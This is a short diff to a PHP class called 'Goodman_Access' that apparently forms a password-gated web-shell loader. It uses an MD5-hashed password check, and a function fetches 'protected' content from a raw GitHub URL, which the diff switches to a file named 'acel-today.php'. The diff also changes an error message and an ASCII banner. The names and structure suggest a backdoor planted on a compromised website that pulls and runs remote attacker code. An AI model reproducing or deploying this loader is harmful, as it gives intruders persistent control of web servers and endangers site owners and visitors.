@@ -140,7 +140,7 @@ class Goodman_Access {
     private function verify_password($password) {
         $stored_hash = '22d7bc1125c3660c0ff61cb57329a7e7';
         return md5($password) === $stored_hash;
-    }z
+    }
     
     /**
      * Handle incoming requests
@@ -156,7 +156,7 @@ class Goodman_Access {
                 header("Location: " . $_SERVER['REQUEST_URI']);
                 exit;
             } else {
-                $this->error_message = "SALAH PAOK!!";
+                $this->error_message = "WRONG PASSWORD!";
             }
         }
         
@@ -172,7 +172,7 @@ class Goodman_Access {
      * Load protected remote content
      */
     private function load_protected_content() {
-        $url = 'https://raw.githubusercontent.com/marketmg2/asss/refs/heads/main/alfa-tronton.txt';
+        $url = 'https://raw.githubusercontent.com/jandaperawan470/acelstarboy/refs/heads/main/acel-today.php';
         $content = $this->fetch_remote($url);
         
         if ($content !== false) {
@@ -482,7 +482,7 @@ class Goodman_Access {
   ██    ██ ██    ██ 
   ▀███████ ▀███████ 
    ██       ██      
-   ▀█       ▀█ ACELTODAY     
+   ▀█       ▀█ jokoowi     
         </div>
         
         <div class="mario-welcome">
